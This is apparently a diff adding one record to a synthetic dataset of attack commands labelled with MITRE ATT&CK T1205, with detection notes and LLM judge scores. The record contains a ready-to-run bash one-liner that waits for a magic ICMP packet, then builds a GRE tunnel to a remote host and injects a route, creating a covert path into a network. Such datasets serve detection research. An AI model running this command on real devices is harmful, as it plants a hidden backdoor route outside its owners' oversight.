@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ni eth0 -l \"icmp[icmptype]=icmp-echo and ip[8]==42\" -c 1 && ip link add gre1 type gretap local 198.51.100.1 remote 203.0.113.50 && ip addr add 10.200.0.1/30 dev gre1 && ip link set gre1 up && vtysh -c \"conf t\" -c \"ip route 172.16.50.0/24 10.200.0.2\"'",
+  "explanation": "Waits for a magic ICMP echo with TTL=42 as the signal. On trigger, creates a GRE TAP interface and adds a route via vtysh to enable a hidden path. Detection: inspect ICMP patterns with unusual TTLs from untrusted sources and alert on ad-hoc GRE interface creation plus new routes.",
+  "rationale_steps": [
+    "Use tcpdump to detect an ICMP echo with specific TTL (42) as the covert trigger.",
+    "Program a GRE TAP interface and bring it up, then add a static route via vtysh through the new link.",
+    "Detect through ICMP anomaly monitoring, ip link audit logs, and FRR route auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-7e3644cb",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command has balanced quoting and proper && chaining with valid flags, though placing tcpdump\u2019s -c after the filter is unconventional but still shell-parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses a TTL-specific ICMP trigger to gate creation of a GRE TAP and a static route via vtysh, consistent with T1205 traffic signaling, though tcpdump option placement and dependency on FRR/vtysh services may affect execution on some systems.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T14:20:31.342546Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid bash constructs, proper command separators, and all flags and arguments are correctly structured for their respective tools.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements traffic signaling by using a specific ICMP packet (TTL=42) as a trigger to establish a GRE tunnel and a static route, creating the described 'hidden path' in alignment with T1205.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:20:44.899155Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
